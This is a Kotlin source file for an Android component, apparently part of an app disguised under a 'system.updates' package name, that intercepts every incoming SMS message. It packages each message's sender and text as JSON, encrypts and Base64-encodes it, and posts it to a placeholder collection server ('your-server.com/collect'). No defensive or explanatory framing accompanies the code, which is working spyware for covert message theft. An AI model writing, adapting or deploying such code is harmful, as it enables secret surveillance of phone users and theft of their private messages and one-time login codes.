package com.system.updates.modules.data

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Base64
import android.util.Log
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import org.json.JSONObject

class SMSListener : BroadcastReceiver() {
    private lateinit var crypto: CryptoManager
    private lateinit var network: NetworkUtils

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            crypto = CryptoManager(context)
            network = NetworkUtils(context)
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (msg in messages) {
                val sender = msg.displayOriginatingAddress ?: "unknown"
                val body = msg.messageBody ?: ""
                val json = JSONObject().apply {
                    put("type", "sms")
                    put("sender", sender)
                    put("body", body)
                    put("timestamp", System.currentTimeMillis())
                }
                val key = crypto.deriveDeviceKey()
                val encrypted = crypto.encryptData(json.toString().toByteArray(), aad = "sms".toByteArray())
                val b64 = Base64.encodeToString(encrypted, Base64.NO_WRAP)
                network.httpPost("https://your-server.com/collect", "data=$b64")
            }
        }
    }
}